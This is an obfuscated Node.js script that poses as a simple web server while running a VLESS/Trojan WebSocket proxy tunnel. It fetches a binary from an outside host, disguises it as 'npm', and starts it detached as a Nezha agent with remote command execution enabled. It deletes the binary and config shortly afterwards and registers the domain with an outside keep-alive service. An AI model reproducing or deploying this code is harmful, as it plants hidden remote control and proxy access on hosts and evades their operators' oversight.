const _0x300537=_0x43ab;(function(_0x179b3b,_0x490027){const _0x2f935f=_0x43ab,_0x1b1359=_0x179b3b();while(!![]){try{const _0x14cd0f=parseInt(_0x2f935f(0x124))/0x1+-parseInt(_0x2f935f(0x104))/0x2*(parseInt(_0x2f935f(0x105))/0x3)+parseInt(_0x2f935f(0x16f))/0x4+parseInt(_0x2f935f(0x108))/0x5+parseInt(_0x2f935f(0x143))/0x6+-parseInt(_0x2f935f(0x165))/0x7+-parseInt(_0x2f935f(0x128))/0x8*(parseInt(_0x2f935f(0x16b))/0x9);if(_0x14cd0f===_0x490027)break;else _0x1b1359['push'](_0x1b1359['shift']());}catch(_0x4c2c32){_0x1b1359['push'](_0x1b1359['shift']());}}}(_0x4891,0x287ad));const os=require('os'),http=require(_0x300537(0x159)),fs=require('fs'),axios=require(_0x300537(0x164)),net=require(_0x300537(0x126)),path=require(_0x300537(0x103)),crypto=require(_0x300537(0x116)),{Buffer}=require(_0x300537(0xff)),{exec,execSync}=require(_0x300537(0x15e)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x300537(0x137)][_0x300537(0x148)]||_0x300537(0x160),NEZHA_SERVER=process['env'][_0x300537(0x132)]||'',NEZHA_PORT=process[_0x300537(0x137)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x300537(0x138)]||'',DOMAIN=process[_0x300537(0x137)]['DOMAIN']||_0x300537(0x166),AUTO_ACCESS=process[_0x300537(0x137)]['AUTO_ACCESS']||!![],WSPATH=process[_0x300537(0x137)]['WSPATH']||UUID[_0x300537(0x170)](0x0,0x8),SUB_PATH=process[_0x300537(0x137)]['SUB_PATH']||'sub',NAME=process[_0x300537(0x137)][_0x300537(0x142)]||_0x300537(0xfa),PORT=process[_0x300537(0x137)][_0x300537(0x144)]||0x1eb4;function _0x43ab(_0x28800c,_0x43c71a){_0x28800c=_0x28800c-0xf7;const _0x489128=_0x4891();let _0x43abb1=_0x489128[_0x28800c];return _0x43abb1;}let ISP='';const GetISP=async()=>{const _0x10953d=_0x300537;try{const _0x726f52=await axios[_0x10953d(0x135)](_0x10953d(0x155)),_0x4e410b=_0x726f52[_0x10953d(0x119)];ISP=(_0x4e410b['country']+'-'+_0x4e410b[_0x10953d(0x14b)])[_0x10953d(0x11b)](/ /g,'_');}catch(_0x35bb74){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x3ec61a,_0x4ea796)=>{const _0x5250e5=_0x300537;if(_0x3ec61a['url']==='/'){const _0x567f23=path['join'](__dirname,_0x5250e5(0xfc));fs[_0x5250e5(0x15b)](_0x567f23,_0x5250e5(0x140),(_0x3d0199,_0x1c6b5c)=>{const _0x4c192a=_0x5250e5;if(_0x3d0199){_0x4ea796['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x4ea796[_0x4c192a(0x13d)](_0x4c192a(0x149));return;}_0x4ea796[_0x4c192a(0x134)](0xc8,{'Content-Type':_0x4c192a(0x154)}),_0x4ea796['end'](_0x1c6b5c);});return;}else{if(_0x3ec61a[_0x5250e5(0x117)]==='/'+SUB_PATH){const _0x23531c=_0x5250e5(0x161)+UUID+'@'+DOMAIN+_0x5250e5(0x13e)+DOMAIN+_0x5250e5(0x131)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x41d79c=_0x5250e5(0x112)+UUID+'@'+DOMAIN+_0x5250e5(0x11d)+DOMAIN+_0x5250e5(0x131)+DOMAIN+_0x5250e5(0x15f)+WSPATH+'#'+NAME+'-'+ISP,_0x114bd3=_0x23531c+'\x0a'+_0x41d79c,_0x44def5=Buffer[_0x5250e5(0x14f)](_0x114bd3)[_0x5250e5(0xfd)](_0x5250e5(0xfe));_0x4ea796[_0x5250e5(0x134)](0xc8,{'Content-Type':_0x5250e5(0x107)}),_0x4ea796['end'](_0x44def5+'\x0a');}else _0x4ea796[_0x5250e5(0x134)](0x194,{'Content-Type':_0x5250e5(0x107)}),_0x4ea796[_0x5250e5(0x13d)](_0x5250e5(0x13b));}}),wss=new WebSocket[(_0x300537(0x129))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x300537(0x14a)];function resolveHost(_0x4a1bcd){return new Promise((_0x33da74,_0x1b1df8)=>{const _0xf20f86=_0x43ab;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xf20f86(0x121)](_0x4a1bcd)){_0x33da74(_0x4a1bcd);return;}let _0x16b66c=0x0;function _0x3dd10f(){const _0x333a0f=_0xf20f86;if(_0x16b66c>=DNS_SERVERS[_0x333a0f(0x10f)]){_0x1b1df8(new Error(_0x333a0f(0x11f)+_0x4a1bcd+_0x333a0f(0x10e)));return;}const _0xec1d32=DNS_SERVERS[_0x16b66c];_0x16b66c++;const _0x10366c=_0x333a0f(0x147)+encodeURIComponent(_0x4a1bcd)+_0x333a0f(0x114);axios['get'](_0x10366c,{'timeout':0x1388,'headers':{'Accept':_0x333a0f(0x136)}})[_0x333a0f(0x11a)](_0x562ced=>{const _0x4472a0=_0x333a0f,_0x2aa82c=_0x562ced['data'];if(_0x2aa82c[_0x4472a0(0x158)]===0x0&&_0x2aa82c[_0x4472a0(0x146)]&&_0x2aa82c['Answer'][_0x4472a0(0x10f)]>0x0){const _0x3e61af=_0x2aa82c[_0x4472a0(0x146)][_0x4472a0(0x168)](_0x194d27=>_0x194d27[_0x4472a0(0x111)]===0x1);if(_0x3e61af){_0x33da74(_0x3e61af[_0x4472a0(0x119)]);return;}}_0x3dd10f();})['catch'](_0x531449=>{_0x3dd10f();});}_0x3dd10f();});}function handleVlessConnection(_0x3b7d81,_0x5f1f7b){const _0x26a418=_0x300537,[_0x1366bd]=_0x5f1f7b,_0x4d95dc=_0x5f1f7b['slice'](0x1,0x11);if(!_0x4d95dc[_0x26a418(0x139)]((_0x28f35c,_0x27d301)=>_0x28f35c==parseInt(uuid[_0x26a418(0x14d)](_0x27d301*0x2,0x2),0x10)))return![];let _0x503bf0=_0x5f1f7b['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x26b709=_0x5f1f7b[_0x26a418(0x170)](_0x503bf0,_0x503bf0+=0x2)['readUInt16BE'](0x0),_0x1c778b=_0x5f1f7b[_0x26a418(0x170)](_0x503bf0,_0x503bf0+=0x1)[_0x26a418(0x106)](),_0x17d7f6=_0x1c778b==0x1?_0x5f1f7b[_0x26a418(0x170)](_0x503bf0,_0x503bf0+=0x4)[_0x26a418(0x125)]('.'):_0x1c778b==0x2?new TextDecoder()[_0x26a418(0x145)](_0x5f1f7b['slice'](_0x503bf0+0x1,_0x503bf0+=0x1+_0x5f1f7b[_0x26a418(0x170)](_0x503bf0,_0x503bf0+0x1)[_0x26a418(0x106)]())):_0x1c778b==0x3?_0x5f1f7b[_0x26a418(0x170)](_0x503bf0,_0x503bf0+=0x10)['reduce']((_0x5ad3aa,_0x566189,_0x530ad1,_0x197f2c)=>_0x530ad1%0x2?_0x5ad3aa['concat'](_0x197f2c[_0x26a418(0x170)](_0x530ad1-0x1,_0x530ad1+0x1)):_0x5ad3aa,[])['map'](_0x1eaae6=>_0x1eaae6[_0x26a418(0x12f)](0x0)[_0x26a418(0xfd)](0x10))[_0x26a418(0x125)](':'):'';_0x3b7d81[_0x26a418(0x16a)](new Uint8Array([_0x1366bd,0x0]));const _0x265c91=createWebSocketStream(_0x3b7d81);return resolveHost(_0x17d7f6)[_0x26a418(0x11a)](_0x9070a=>{const _0x4d6681=_0x26a418;net[_0x4d6681(0xfb)]({'host':_0x9070a,'port':_0x26b709},function(){const _0x4ea61b=_0x4d6681;this['write'](_0x5f1f7b[_0x4ea61b(0x170)](_0x503bf0)),_0x265c91['on'](_0x4ea61b(0x133),()=>{})[_0x4ea61b(0x12b)](this)['on'](_0x4ea61b(0x133),()=>{})[_0x4ea61b(0x12b)](_0x265c91);})['on']('error',()=>{});})[_0x26a418(0x173)](_0x4f1e89=>{const _0x59324b=_0x26a418;net[_0x59324b(0xfb)]({'host':_0x17d7f6,'port':_0x26b709},function(){const _0x12a0de=_0x59324b;this['write'](_0x5f1f7b[_0x12a0de(0x170)](_0x503bf0)),_0x265c91['on'](_0x12a0de(0x133),()=>{})[_0x12a0de(0x12b)](this)['on'](_0x12a0de(0x133),()=>{})[_0x12a0de(0x12b)](_0x265c91);})['on'](_0x59324b(0x133),()=>{});}),!![];}function handleTrojanConnection(_0x8c88ab,_0x1e87fa){const _0x3cc3b0=_0x300537;try{if(_0x1e87fa[_0x3cc3b0(0x10f)]<0x3a)return![];const _0x2d3f3c=_0x1e87fa[_0x3cc3b0(0x170)](0x0,0x38)[_0x3cc3b0(0xfd)](),_0x2fa749=[UUID];let _0x44ee92=null;for(const _0x5ea2e1 of _0x2fa749){const _0x3a7eac=crypto[_0x3cc3b0(0x16e)](_0x3cc3b0(0x15d))[_0x3cc3b0(0x13f)](_0x5ea2e1)['digest'](_0x3cc3b0(0x11e));if(_0x3a7eac===_0x2d3f3c){_0x44ee92=_0x5ea2e1;break;}}if(!_0x44ee92)return![];let _0x24cfa2=0x38;_0x1e87fa[_0x24cfa2]===0xd&&_0x1e87fa[_0x24cfa2+0x1]===0xa&&(_0x24cfa2+=0x2);const _0x4109ff=_0x1e87fa[_0x24cfa2];if(_0x4109ff!==0x1)return![];_0x24cfa2+=0x1;const _0x2bded8=_0x1e87fa[_0x24cfa2];_0x24cfa2+=0x1;let _0x4a5125,_0x58daa3;if(_0x2bded8===0x1)_0x4a5125=_0x1e87fa[_0x3cc3b0(0x170)](_0x24cfa2,_0x24cfa2+0x4)[_0x3cc3b0(0x125)]('.'),_0x24cfa2+=0x4;else{if(_0x2bded8===0x3){const _0x2b2761=_0x1e87fa[_0x24cfa2];_0x24cfa2+=0x1,_0x4a5125=_0x1e87fa[_0x3cc3b0(0x170)](_0x24cfa2,_0x24cfa2+_0x2b2761)['toString'](),_0x24cfa2+=_0x2b2761;}else{if(_0x2bded8===0x4)_0x4a5125=_0x1e87fa[_0x3cc3b0(0x170)](_0x24cfa2,_0x24cfa2+0x10)[_0x3cc3b0(0x115)]((_0x12e021,_0x54bd70,_0x2b06b4,_0x25940f)=>_0x2b06b4%0x2?_0x12e021[_0x3cc3b0(0x156)](_0x25940f[_0x3cc3b0(0x170)](_0x2b06b4-0x1,_0x2b06b4+0x1)):_0x12e021,[])[_0x3cc3b0(0xf7)](_0x38233e=>_0x38233e[_0x3cc3b0(0x12f)](0x0)[_0x3cc3b0(0xfd)](0x10))['join'](':'),_0x24cfa2+=0x10;else return![];}}_0x58daa3=_0x1e87fa[_0x3cc3b0(0x12f)](_0x24cfa2),_0x24cfa2+=0x2;_0x24cfa2<_0x1e87fa[_0x3cc3b0(0x10f)]&&_0x1e87fa[_0x24cfa2]===0xd&&_0x1e87fa[_0x24cfa2+0x1]===0xa&&(_0x24cfa2+=0x2);const _0x1e8361=createWebSocketStream(_0x8c88ab);return resolveHost(_0x4a5125)[_0x3cc3b0(0x11a)](_0x3da80f=>{const _0x18fab2=_0x3cc3b0;net[_0x18fab2(0xfb)]({'host':_0x3da80f,'port':_0x58daa3},function(){const _0x1b3ef0=_0x18fab2;_0x24cfa2<_0x1e87fa[_0x1b3ef0(0x10f)]&&this['write'](_0x1e87fa[_0x1b3ef0(0x170)](_0x24cfa2)),_0x1e8361['on']('error',()=>{})[_0x1b3ef0(0x12b)](this)['on']('error',()=>{})[_0x1b3ef0(0x12b)](_0x1e8361);})['on'](_0x18fab2(0x133),()=>{});})['catch'](_0x1898d8=>{const _0x5ee9db=_0x3cc3b0;net[_0x5ee9db(0xfb)]({'host':_0x4a5125,'port':_0x58daa3},function(){const _0xbaef9a=_0x5ee9db;_0x24cfa2<_0x1e87fa['length']&&this[_0xbaef9a(0x162)](_0x1e87fa[_0xbaef9a(0x170)](_0x24cfa2)),_0x1e8361['on'](_0xbaef9a(0x133),()=>{})[_0xbaef9a(0x12b)](this)['on'](_0xbaef9a(0x133),()=>{})[_0xbaef9a(0x12b)](_0x1e8361);})['on'](_0x5ee9db(0x133),()=>{});}),!![];}catch(_0x4e7449){return![];}}function _0x4891(){const _0xecd8e5=['message','\x20with\x20all\x20DNS\x20servers','length','Automatic\x20Access\x20Task\x20added\x20successfully','type','trojan://','443','&type=A','reduce','crypto','url','/bin/bash','data','then','replace','arm',':443?security=tls&sni=','hex','Failed\x20to\x20resolve\x20','connection','test','https://arm64.ssss.nyc.mn/agent','pop','75960iIOzjp','join','net','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','24xtKHzQ','Server','https://oooo.serv00.net/add-url','pipe','includes','arch','https://','readUInt16BE','client_secret:\x20','&fp=chrome&type=ws&host=','NEZHA_SERVER','error','writeHead','get','application/dns-json','env','NEZHA_KEY','every','false','Not\x20Found\x0a','--tls','end',':443?encryption=none&security=tls&sni=','update','utf8','https://amd64.ssss.nyc.mn/agent','NAME','1525188yqUWku','PORT','decode','Answer','https://dns.google/resolve?name=','UUID','Hello\x20world!','1.1.1.1','asOrganization','8443','substr','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','from','unlink','npm','split','config.yaml','text/html','https://speed.cloudflare.com/meta','concat','Server\x20is\x20running\x20on\x20port\x20','Status','http','2053','readFile','aarch64','sha224','child_process','&path=%2F','5efabea4-f6d4-91fd-b8f0-17e004c89c66','vless://','write','listen','axios','26698wXYTed','1234.abc.com','application/json','find','close','send','927477hzjEww','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','utf-8','createHash','1211912BHYUNi','slice','setsid\x20nohup\x20./npm\x20-s\x20','once','catch','map','post','log','Hug','connect','index.html','toString','base64','buffer','npm\x20is\x20already\x20running,\x20skip\x20running...','createWriteStream','trim','path','90fBCfqZ','18861GLhipj','readUInt8','text/plain','642785ySGrOz','true','https://amd64.ssss.nyc.mn/v1','2083','2096'];_0x4891=function(){return _0xecd8e5;};return _0x4891();}wss['on'](_0x300537(0x120),(_0x38c316,_0x216b46)=>{const _0x45726c=_0x300537,_0x3531ab=_0x216b46['url']||'';_0x38c316[_0x45726c(0x172)](_0x45726c(0x10d),_0x7a383a=>{const _0x2e67cb=_0x45726c;if(_0x7a383a[_0x2e67cb(0x10f)]>0x11&&_0x7a383a[0x0]===0x0){const _0x1844d2=_0x7a383a[_0x2e67cb(0x170)](0x1,0x11),_0x5744b5=_0x1844d2[_0x2e67cb(0x139)]((_0x2178e8,_0x55c90c)=>_0x2178e8==parseInt(uuid['substr'](_0x55c90c*0x2,0x2),0x10));if(_0x5744b5){!handleVlessConnection(_0x38c316,_0x7a383a)&&_0x38c316[_0x2e67cb(0x169)]();return;}}!handleTrojanConnection(_0x38c316,_0x7a383a)&&_0x38c316[_0x2e67cb(0x169)]();})['on'](_0x45726c(0x133),()=>{});});const getDownloadUrl=()=>{const _0xa7b371=_0x300537,_0x2e4d38=os[_0xa7b371(0x12d)]();return _0x2e4d38===_0xa7b371(0x11c)||_0x2e4d38==='arm64'||_0x2e4d38===_0xa7b371(0x15c)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0xa7b371(0x122):!NEZHA_PORT?_0xa7b371(0x10a):_0xa7b371(0x141);},downloadFile=async()=>{const _0x5cb0e9=_0x300537;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3ff44b=getDownloadUrl(),_0x43e3f1=await axios({'method':'get','url':_0x3ff44b,'responseType':'stream'}),_0x872dc5=fs[_0x5cb0e9(0x101)](_0x5cb0e9(0x151));return _0x43e3f1['data'][_0x5cb0e9(0x12b)](_0x872dc5),new Promise((_0x30ffd5,_0x2ac5f6)=>{const _0x3ab3c4=_0x5cb0e9;_0x872dc5['on']('finish',()=>{const _0x41daba=_0x43ab;console[_0x41daba(0xf9)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x873b37=>{if(_0x873b37)_0x2ac5f6(_0x873b37);_0x30ffd5();});}),_0x872dc5['on'](_0x3ab3c4(0x133),_0x2ac5f6);});}catch(_0x4062f6){throw _0x4062f6;}},runnz=async()=>{const _0x4cce65=_0x300537;try{const _0x39f104=execSync(_0x4cce65(0x16c),{'encoding':_0x4cce65(0x16d)});if(_0x39f104[_0x4cce65(0x102)]()!==''){console[_0x4cce65(0xf9)](_0x4cce65(0x100));return;}}catch(_0x530cf3){}await downloadFile();let _0x5d10d2='',_0x5e1482=[_0x4cce65(0x113),_0x4cce65(0x14c),_0x4cce65(0x10c),'2087',_0x4cce65(0x10b),_0x4cce65(0x15a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2b957f=_0x5e1482[_0x4cce65(0x12c)](NEZHA_PORT)?_0x4cce65(0x13c):'';_0x5d10d2=_0x4cce65(0x171)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2b957f+_0x4cce65(0x127);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x300254=NEZHA_SERVER[_0x4cce65(0x12c)](':')?NEZHA_SERVER[_0x4cce65(0x152)](':')[_0x4cce65(0x123)]():'',_0x5d01c6=_0x5e1482[_0x4cce65(0x12c)](_0x300254)?_0x4cce65(0x109):_0x4cce65(0x13a),_0x4fedd5=_0x4cce65(0x130)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5d01c6+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x4cce65(0x153),_0x4fedd5);}_0x5d10d2=_0x4cce65(0x14e);}else{console[_0x4cce65(0xf9)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5d10d2,{'shell':_0x4cce65(0x118)},_0x48abc0=>{const _0x243dfd=_0x4cce65;if(_0x48abc0)console[_0x243dfd(0x133)]('npm\x20running\x20error:',_0x48abc0);else console[_0x243dfd(0xf9)]('npm\x20is\x20running');});}catch(_0x13d52f){console[_0x4cce65(0x133)]('error:\x20'+_0x13d52f);}};async function addAccessTask(){const _0x361a40=_0x300537;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4aa739=_0x361a40(0x12e)+DOMAIN;try{const _0x3ef094=await axios[_0x361a40(0xf8)](_0x361a40(0x12a),{'url':_0x4aa739},{'headers':{'Content-Type':_0x361a40(0x167)}});console['log'](_0x361a40(0x110));}catch(_0x15bc6e){}}const delFiles=()=>{const _0x383edc=_0x300537;fs[_0x383edc(0x150)](_0x383edc(0x151),()=>{}),fs['unlink'](_0x383edc(0x153),()=>{});};httpServer[_0x300537(0x163)](PORT,()=>{const _0xf58ed9=_0x300537;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0xf58ed9(0x157)+PORT);});
